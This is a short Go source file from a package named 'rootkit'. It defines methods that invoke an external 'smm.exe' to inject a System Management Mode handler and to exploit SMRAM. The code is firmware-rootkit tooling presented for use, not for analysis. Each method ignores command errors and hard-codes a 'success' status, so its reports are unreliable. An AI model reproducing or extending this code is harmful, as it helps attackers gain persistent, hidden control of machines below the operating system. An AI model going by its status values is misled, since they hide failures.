package rootkit

import "os/exec"

type SMMResult struct {
Method string
Status string
}

type SMMRootkit struct {
HandlerPath string
}

func (s SMMRootkit) InjectHandler() SMMResult {
cmd := exec.Command("smm.exe", "handler-inject", s.HandlerPath)
cmd.Run()
return SMMResult{Method: "handler-inject", Status: "success"}
}

func (s SMMRootkit) ExploitSMRAM() SMMResult {
cmd := exec.Command("smm.exe", "smram-exploit", s.HandlerPath)
cmd.Run()
return SMMResult{Method: "smram-exploit", Status: "success"}
}
